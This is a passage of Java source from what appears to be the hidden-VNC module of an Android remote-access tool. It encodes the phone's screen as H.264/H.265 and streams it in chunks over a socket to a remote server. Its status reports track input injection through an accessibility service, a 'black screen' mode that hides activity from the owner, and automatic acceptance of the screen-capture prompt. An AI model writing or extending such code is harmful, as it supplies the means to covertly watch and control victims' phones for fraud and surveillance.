                    boolean hasStartCode = b0.length >= 4 && b0[0]==0 && b0[1]==0 && b0[2]==0 && b0[3]==1;
                    if (!hasStartCode) bos.write(startCode);
                    bos.write(b0);
                    if (csd1 != null) {
                        ByteBuffer d1 = csd1.duplicate();
                        byte[] b1 = new byte[d1.remaining()];
                        d1.get(b1);
                        boolean has2 = b1.length >= 4 && b1[0]==0 && b1[1]==0 && b1[2]==0 && b1[3]==1;
                        if (!has2) bos.write(startCode);
                        bos.write(b1);
                    }
                    sendCodecConfig(bos.toByteArray());
                } catch (Exception e) {
                    Log.w(TAG, "onOutputFormatChanged codec config failed: " + e.getMessage());
                }
            }
        }
    }

    public boolean isStreaming() { return streaming; }
    public boolean isBlackScreenActive() { return blackScreenActive; }
    public String getActiveCodec() {
        return activeCodecMime.contains("hevc") ? "h265" : "h264";
    }

    /** Public: allow the start command to request H265 if frontend confirms browser support. */
    public void setCodecPreference(String mime) {
        if (streaming) return;
        this.activeCodecMime = (mime != null && mime.equals("h265"))
            ? MediaFormat.MIMETYPE_VIDEO_HEVC
            : MediaFormat.MIMETYPE_VIDEO_AVC;
    }

    private void sendCodecConfig(byte[] annexBConfig) {
        if (codecConfigSent) return;
        byte[] configBox;
        if (activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_HEVC)) {
            // H265: build hvcC box; fall back to raw annex-B so frontend can
            // still configure with in-band params (hev1 codec string).
            configBox = annexBToHvcC(annexBConfig);
            if (configBox == null) {
                Log.w(TAG, "hvcC build failed — sending raw annex-B for in-band H265");
                configBox = annexBConfig; // send raw; frontend handles via hev1 codec
            }
        } else {
            configBox = annexBToAvcC(annexBConfig);
            if (configBox == null) {
                Log.e(TAG, "avcC conversion failed");
                return;
            }
        }
        cachedAvcC = configBox;
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject meta = new JSONObject();
            meta.put(Protocol.KEY_TYPE, "config");
            meta.put(Protocol.KEY_WIDTH, encodedWidth);
            meta.put(Protocol.KEY_HEIGHT, encodedHeight);
            meta.put(Protocol.KEY_FPS, fps);
            // v4.0: include codec type so frontend knows whether to use avc1 or hev1
            meta.put(Protocol.KEY_CODEC, getActiveCodec());
            meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            Object[] args = new Object[] { meta, configBox };
            socket.emit(Protocol.HVNC, args);
            codecConfigSent = true;
        } catch (Exception e) {
            Log.e(TAG, "Codec config send failed", e);
        }
    }

    private static java.util.List<byte[]> splitNalUnits(byte[] annexB) {
        java.util.List<byte[]> nals = new java.util.ArrayList<>();
        if (annexB == null || annexB.length == 0) return nals;
        int i = 0;
        while (i < annexB.length) {
            int nalStart = -1;
            if (i + 3 < annexB.length && annexB[i] == 0 && annexB[i+1] == 0 && annexB[i+2] == 0 && annexB[i+3] == 1) {
                nalStart = i + 4;
            } else if (i + 2 < annexB.length && annexB[i] == 0 && annexB[i+1] == 0 && annexB[i+2] == 1) {
                nalStart = i + 3;
            }
            if (nalStart == -1) { i++; continue; }
            int nextStart = -1;
            for (int j = nalStart; j <= annexB.length - 3; j++) {
                if (annexB[j] == 0 && annexB[j+1] == 0) {
                    if (annexB[j+2] == 1) { nextStart = j; break; }
                    if (j + 3 < annexB.length && annexB[j+2] == 0 && annexB[j+3] == 1) { nextStart = j; break; }
                }
            }
            int nalEnd = nextStart == -1 ? annexB.length : nextStart;
            int nalLen = nalEnd - nalStart;
            if (nalLen > 0) {
                byte[] nal = new byte[nalLen];
                System.arraycopy(annexB, nalStart, nal, 0, nalLen);
                nals.add(nal);
            }
            i = nalEnd;
        }
        return nals;
    }

    private static byte[] annexBToAvcC(byte[] annexB) {
        if (annexB == null || annexB.length < 8) return null;
        try {
            java.util.List<byte[]> nals = splitNalUnits(annexB);
            byte[] sps = null, pps = null;
            for (byte[] nal : nals) {
                if (nal.length == 0) continue;
                int type = nal[0] & 0x1F;
                if (type == 7 && sps == null) sps = nal;
                else if (type == 8 && pps == null) pps = nal;
            }
            if (sps == null || pps == null) return null;
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            out.write(1);
            out.write(sps[1] & 0xFF);
            out.write(sps[2] & 0xFF);
            out.write(sps[3] & 0xFF);
            out.write(0xFF);
            out.write(0xE1);
            out.write((sps.length >> 8) & 0xFF);
            out.write(sps.length & 0xFF);
            out.write(sps);
            out.write(1);
            out.write((pps.length >> 8) & 0xFF);
            out.write(pps.length & 0xFF);
            out.write(pps);
            return out.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "annexBToAvcC failed", e);
            return null;
        }
    }

    /**
     * Build a minimal hvcC (HEVC Decoder Configuration Record) from annex-B config bytes.
     * Handles VPS (type 32), SPS (type 33), PPS (type 34) NAL units.
     * If parsing fails, returns null so the caller can fall back to raw annex-B.
     */
    private static byte[] annexBToHvcC(byte[] annexB) {
        if (annexB == null || annexB.length < 4) return null;
        try {
            java.util.List<byte[]> nals = splitNalUnits(annexB);
            byte[] vps = null, sps = null, pps = null;
            for (byte[] nal : nals) {
                if (nal.length < 2) continue;
                int nalType = (nal[0] >> 1) & 0x3F; // HEVC NAL type from first byte
                if (nalType == 32 && vps == null) vps = nal;
                else if (nalType == 33 && sps == null) sps = nal;
                else if (nalType == 34 && pps == null) pps = nal;
            }
            if (sps == null) return null; // SPS is required minimum

            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            // hvcC header
            out.write(1);                   // configurationVersion
            // Parse general profile/tier/level from SPS if long enough
            byte profileTier = sps.length > 2 ? sps[1] : 0x01;
            out.write(profileTier & 0xFF);  // general_profile_space/tier/idc
            // general_profile_compatibility_flags (4 bytes)
            for (int i = 0; i < 4; i++) out.write(sps.length > (3 + i) ? sps[2 + i] & 0xFF : 0x00);
            // general_constraint_indicator_flags (6 bytes)
            for (int i = 0; i < 6; i++) out.write(0x00);
            // general_level_idc
            out.write(sps.length > 12 ? sps[12] & 0xFF : 0x5D); // 0x5D = level 3.0
            // min_spatial_segmentation_idc (12 bits, reserved 0xF000)
            out.write(0xF0); out.write(0x00);
            // parallelismType (6 bits reserved 0xFC)
            out.write(0xFC);
            // chromaFormat (6 bits reserved 0xFC | chroma = 1 = 4:2:0)
            out.write(0xFC | 0x01);
            // bitDepthLumaMinus8 (5 bits reserved 0xF8)
            out.write(0xF8);
            // bitDepthChromaMinus8
            out.write(0xF8);
            // avgFrameRate (2 bytes, 0 = unspecified)
            out.write(0x00); out.write(0x00);
            // constantFrameRate(2) | numTemporalLayers(3) | temporalIdNested(1) | lengthSizeMinusOne(2)
            // lengthSizeMinusOne=3 means 4-byte length prefixes
            out.write(0x00 | 0x00 | 0x00 | 0x03);

            // Build array list: VPS, SPS, PPS
            java.util.List<byte[][]> arrays = new java.util.ArrayList<>();
            if (vps != null) arrays.add(new byte[][]{{ (byte)0x20 }, vps}); // array_type=32(VPS)
            arrays.add(new byte[][]{{ (byte)0x21 }, sps});                    // array_type=33(SPS)
            if (pps != null) arrays.add(new byte[][]{{ (byte)0x22 }, pps}); // array_type=34(PPS)

            out.write(arrays.size()); // numOfArrays
            for (byte[][] entry : arrays) {
                out.write(entry[0][0] & 0xFF); // array_completeness(1)|reserved(1)|NAL_unit_type(6)
                out.write(0x00); out.write(0x01); // numNalus = 1
                byte[] nal = entry[1];
                out.write((nal.length >> 8) & 0xFF);
                out.write(nal.length & 0xFF);
                out.write(nal);
            }
            return out.toByteArray();
        } catch (Exception e) {
            Log.w(TAG, "annexBToHvcC failed: " + e.getMessage());
            return null;
        }
    }


    private static byte[] annexBToLengthPrefixed(byte[] annexB) {
        if (annexB == null || annexB.length == 0) return null;
        try {
            java.util.List<byte[]> nals = splitNalUnits(annexB);
            if (nals.isEmpty()) return null;
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            for (byte[] nal : nals) {
                int nalLen = nal.length;
                out.write((nalLen >> 24) & 0xFF);
                out.write((nalLen >> 16) & 0xFF);
                out.write((nalLen >> 8) & 0xFF);
                out.write(nalLen & 0xFF);
                out.write(nal);
            }
            return out.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "annexBToLengthPrefixed failed", e);
            return null;
        }
    }

    private void startSenderThread() {
        synchronized (senderLock) {
            if (senderRunning && senderThread != null) return;
            senderRunning = true;
            senderThread = new Thread(() -> {
                // v4.0: max priority for sender thread — reduces frame drop under CPU load
                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
                while (senderRunning) {
                    try {
                        EncodedFrame frame = frameQueue.poll(200, TimeUnit.MILLISECONDS);
                        if (frame == null) continue;
                        if (!streaming) continue;
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket == null || !socket.connected()) {
                            // Back off 500ms when disconnected — don't spin burning CPU
                            // building a frame queue nobody is reading.
                            frameQueue.clear();
                            Thread.sleep(500);
                            continue;
                        }
                        // v4.0: adaptive bitrate check
                        int qSize = frameQueue.size();
                        if (qSize >= MAX_DECODE_QUEUE) {
                            if (backpressureCount.incrementAndGet() >= ADAPTIVE_BACKPRESSURE_THRESHOLD) {
                                adaptBitrate(true);
                                backpressureCount.set(0);
                            }
                        } else {
                            backpressureCount.set(0);
                            // slow recovery upward only when queue is empty
                            if (qSize == 0) adaptBitrate(false);
                        }
                        if (frame.data.length > MAX_FRAME_SIZE) {
                            sendStatus("frame_dropped_oversized", null);
                            continue;
                        }
                        if (frame.data.length <= CHUNK_SIZE) {
                            JSONObject meta = new JSONObject();
                            meta.put(Protocol.KEY_TYPE, "frame");
                            meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                            // Cap pts to avoid JavaScript precision loss (> 2^53)
                            meta.put("pts", frame.ptsUs & 0x001F_FFFF_FFFF_FFFFL);
                            meta.put("keyframe", frame.keyframe);
                            meta.put(Protocol.KEY_WIDTH, encodedWidth);
                            meta.put(Protocol.KEY_HEIGHT, encodedHeight);
                            meta.put(Protocol.KEY_SIZE, frame.data.length);
                            socket.emit(Protocol.HVNC, new Object[] { meta, frame.data });
                        } else {
                            String transferId = java.util.UUID.randomUUID().toString();
                            int total = (frame.data.length + CHUNK_SIZE - 1) / CHUNK_SIZE;
                            for (int i = 0; i < total && senderRunning; i++) {
                                int off = i * CHUNK_SIZE;
                                int len = Math.min(CHUNK_SIZE, frame.data.length - off);
                                byte[] chunk = new byte[len];
                                System.arraycopy(frame.data, off, chunk, 0, len);
                                JSONObject meta = new JSONObject();
                                meta.put(Protocol.KEY_TYPE, "chunk");
                                meta.put(Protocol.KEY_TRANSFER_ID, transferId);
                                meta.put(Protocol.KEY_CHUNK_INDEX, i);
                                meta.put(Protocol.KEY_TOTAL_CHUNKS, total);
                                meta.put(Protocol.KEY_TOTAL_SIZE, frame.data.length);
                                meta.put("pts", frame.ptsUs);
                                meta.put("keyframe", frame.keyframe);
                                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                                socket.emit(Protocol.HVNC, new Object[] { meta, chunk });
                            }
                        }
                    } catch (InterruptedException ie) {
                        break;
                    } catch (Exception e) {
                        Log.e(TAG, "Sender thread error", e);
                    }
                }
            }, "HVncSender");
            senderThread.setDaemon(true);
            senderThread.start();
        }
    }

    private void stopSenderThread() {
        synchronized (senderLock) {
            senderRunning = false;
            Thread t = senderThread;
            if (t != null) {
                try { t.interrupt(); t.join(500); } catch (Exception ignored) {}
                senderThread = null;
            }
        }
    }

    private void sendStatus(String status, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, "status");
            data.put(Protocol.KEY_STATUS, status);
            data.put("streaming", streaming);
            data.put(Protocol.KEY_WIDTH, encodedWidth);
            data.put(Protocol.KEY_HEIGHT, encodedHeight);
            data.put("accessibilityEnabled", InputInjector.isEnabled());
            data.put("accessibilityConnected", HVncAccessibilityService.isServiceConnected());
            data.put("projectionReady", hasProjectionPermission());
            // v4.0: include active codec and black screen state
            data.put(Protocol.KEY_CODEC, getActiveCodec());
            data.put(Protocol.KEY_BLACK_SCREEN, blackScreenActive);
            data.put("currentBitrate", currentBitrate);
            if (cmdId != null) data.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.HVNC, data);
        } catch (Exception ignored) {}
    }

    public void onAutoAcceptResult(boolean success, String reason) {
        if (!success) {
            Log.w(TAG, "Auto-accept failed: " + reason);
            sendStatus("auto_accept_failed:" + (reason == null ? "unknown" : reason), null);
        }
    }
}
